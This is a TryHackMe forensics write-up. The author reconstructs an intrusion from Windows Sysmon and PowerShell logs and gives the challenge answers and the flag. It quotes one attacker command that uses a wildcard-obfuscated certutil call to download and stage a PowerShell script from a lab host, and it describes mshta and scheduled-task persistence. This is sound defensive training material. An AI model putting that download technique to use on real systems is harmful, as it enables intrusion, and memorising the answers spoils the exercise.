# Handbook for the Recently Compromised | THM

> No fancy exploit, no reverse shell. Just Windows event logs, suspicious commands, and an attacker who thought hiding behind wildcards was enough.

---

## First Look

Started by checking the provided files:

```bash
cd ~/Desktop/artifacts/tools
ls -lah
```

Found two interesting Windows event logs:

- `Microsoft-Windows-Sysmon%4Operational.evtx`
- `PowerShell-Operational.evtx`

Also found `evtx_dump`, which we can use to read the Windows event logs.

This room is different from a typical exploitation challenge. The goal is to investigate the logs and reconstruct what happened.

---

## The Hidden Utility

Started searching the Sysmon logs for commands containing wildcard characters:

```bash
./evtx_dump ../Microsoft-Windows-Sysmon%4Operational.evtx | grep -i "CommandLine" | grep "*"
```

Found a suspicious PowerShell command:

```powershell
& ((gci C:\Windows\System32\certu*.exe)[0].FullName) -urlcache -f http://pipeline-cdn.thm:8088/pipeline-sync.ps1 $env:TEMP\pipeline-sync.ps1
```

Interesting.

The attacker used `certu*.exe` instead of writing the executable name directly.

The wildcard resolves to:

```text
certutil.exe
```

This is a legitimate Windows utility, but attackers can abuse it to download files from remote servers.

**Answer 1:** `certutil.exe`

---

## Second-Stage Payload

The same command revealed the download URL.

```text
http://pipeline-cdn.thm:8088/pipeline-sync.ps1
```

The attacker used `certutil.exe` with `-urlcache -f` to download a second-stage PowerShell script.

The downloaded file was saved inside the user's temporary directory and executed afterward.

**Answer 2:**

```text
http://pipeline-cdn.thm:8088/pipeline-sync.ps1
```

---

## Initial Execution — MSHTA

Next, searched the Sysmon logs for `mshta.exe`:

```bash
./evtx_dump ../Microsoft-Windows-Sysmon%4Operational.evtx | grep -i -C 5 "mshta.exe"
```

Found this suspicious execution:

```text
C:\Windows\SysWOW64\mshta.exe
C:\Users\j.collins\Downloads\pipeline-check.hta
```

The attacker used `mshta.exe` to execute an HTA file.

This technique is known as Signed Binary Proxy Execution: Mshta.

MITRE ATT&CK reference:

```text
T1218.005
```

**Answer 3:** `T1218.005`

---

## Persistence Mechanism

After investigating the execution chain, I searched for scheduled task activity:

```bash
./evtx_dump ../Microsoft-Windows-Sysmon%4Operational.evtx | grep -i -E -C 5 "schtasks|StudioPipelineSync"
```

Found a suspicious scheduled task named:

```text
StudioPipelineSync
```

The attacker used Windows Task Scheduler to maintain persistence.

The task was configured to execute when the user logged in.

MITRE ATT&CK reference:

```text
T1053.005
```

**Answer 4:** `T1053.005`

---

## Recovering the Flag

Finally, moved to the PowerShell Operational logs.

```bash
./evtx_dump ../PowerShell-Operational.evtx | grep -i -A 10 "ScriptBlockText"
```

The logs contained suspicious PowerShell script content and an encoded Base64 value.

Decoded it:

```bash
echo -n 'VEhNe3RIM19HaDBzdF93MXRIX1RoM19NMDVUfQ==' | base64 -d
```

The result:

```text
THM{tH3_Gh0st_w1tH_Th3_M05T}
```

And that's the flag.

---

## What I Learned

- EVTX files contain valuable Windows forensic evidence.
- `certutil.exe` can be abused as a download utility.
- `mshta.exe` can execute malicious HTA files.
- Scheduled tasks are a common persistence mechanism.
- PowerShell Script Block Logging can reveal suspicious commands and encoded payloads.
- Correlating different event logs helps reconstruct an attacker's activity.
---

> Author: LatenT | Date: October 2026
